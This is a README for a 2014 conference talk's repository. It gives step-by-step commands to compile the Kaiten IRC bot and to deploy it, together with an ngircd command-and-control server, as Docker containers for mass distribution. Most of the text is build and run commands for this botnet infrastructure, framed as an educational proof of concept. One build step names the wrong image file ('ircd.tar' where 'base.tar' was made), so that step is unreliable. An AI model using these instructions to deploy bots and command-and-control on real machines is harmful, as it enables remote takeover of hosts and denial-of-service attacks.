# Linux containers as a rapid deployment attack mechanism

This repository contains assets related to the talk of the above name presented
at Toorcon 16 on October 26th, 2014.

## About

Linux containers represent a self contained application which brings the 
userland required for execution.  When utilized as an attack mechanism it
represents a simple method for deploying a lightweight tool to a large number
of machines.

For this demonstration we have two primary containers, an IRC daemon which acts
as a command and control coordination point and a worker which will execute
commands as issued to the IRC server.

**Note**: The files here are provided for educational purposes to demonstrate a
proof of concept.  These tools should only be used with systems which you fully
control.

## Directions

### Setup the IRC daemon

To spawn the IRC daemon simply run the following command from a docker enabled
host:

```
$ docker run -p 6667:6667 -e NGIRCD_CONF_URL=http://fpaste.org/145254/14143107/raw/ \
  quay.io/brianredbeard/ngircd
```
This will spawn a listener which reads the configuration from the listed file
hosting service.  This file is also located in the `ngircd` directory as
`ngircd.conf`.

### Setup the listeners

To spawn the listeners you will need to supply the environment variable
`KAITEN_SERVER` to the process when it runs.  This could be done at the command
line by exporting a variable, prefixing the command with the variable (i.e.
`$ KAITEN_SERVER=127.0.0.1 ./kaiten`), and the third option (in the case of
docker) is to pass the flag `-e KAITEN_SERVER=127.0.0.1` option to your `docker
run` command.

```
$ docker run -e KAITEN_SERVER=127.0.0.1 quay.io/brianredbeard/kaiten
```

By default, the Kaiten binary included here will attempt to connect to the IRC
channel "#gopherjams".  

## Building from scratch

### IRCD

This container was built using [buildroot](http://www.buildroot.org). Buildroot
is designed for building lightweight Linux distributions. In this case we use
it to build a base image from which we base the rest of our IRC daemon.

First, download the latest version of buildroot from
[http://www.buildroot.org/downloads/](http://www.buildroot.org/downloads/)
Untar this to a working directory and copy the configuration file
`br-ircd.config` into the buildroot directory as the name `.config`.  After this
has been completed run the command:

```bash
$ make
```

This will download and compile all components needed to build a base image from
which our IRC server will be run.

When the compile is complete, the resulting file will be at the following
location within the buildroot directory: `output/images/rootfs.tar`.

Copy this file to a temporary location with the name `ircd.tar`.

Now, if we're using docker we can load this file into our repository via the
command:

```bash
$ cat ircd.tar | docker import - -t ircd:base
```

Now we can use this with the `Dockerfile` provided to build into a quickly
deployable tool.

To do this change into the directory `ngircd` within this repository and run
the command:

```bash
$ docker build -t ircd:1.0 .
```

The resulting image will be tagged as `ircd:1.0` and can be spawned with the
following command:

```bash
$ docker run -t -i -p 6667:6667 ircd:1.0
```

Further modification of this image can be assertained by analyzing the 
`Dockerfile` and related assets as well as by referencing the upstream docker
documentation.

### Kaiten

The build of a Kaiten container happens in two parts, first we have to build
the Kaiten binary then we will need to add it a base container.

#### Kaiten binary build

The build of Kaiten is very simple.  It should be possible using any modern C
compiler.  For our purposes we will use GCC.

Change into the `kaiten` subdirectory of this repository and run the command:

```bash
$ gcc -o kaiten -lm kaiten.c
```

#### Kaiten container build

This container was built using [buildroot](http://www.buildroot.org). Buildroot
is designed for building lightweight Linux distributions. In this case we use
it to build a base image from which we base the rest of our IRC daemon.

First, download the latest version of buildroot from
[http://www.buildroot.org/downloads/](http://www.buildroot.org/downloads/)
Untar this to a working directory and copy the configuration file
`br-kaiten.config` into the buildroot directory as the name `.config`.  After this
has been completed run the command:

```bash
$ make
```

This will download and compile all components needed to build a base image from
which we can further modify.

When the compile is complete, the resulting file will be at the following
location within the buildroot directory: `output/images/rootfs.tar`.

Copy this file to a temporary location with the name `base.tar`.

Now, if we're using docker we can load this file into our repository via the
command:

```bash
$ cat ircd.tar | docker import - -t base:base
```

Now we can use this with the `Dockerfile` provided to build into a quickly
deployable tool.

To do this change into the directory `kaiten` within this repository and run
the command:

```bash
$ docker build -t kaiten:1.0 .
```

The resulting image will be tagged as `kaiten:1.0` and can be spawned with the
following command:

```bash
$ docker run -t -i -e KAITEN_SERVER kaiten:1.0
```

Further modification of this image can be assertained by analyzing the 
`Dockerfile` and related assets as well as by referencing the upstream docker
documentation.
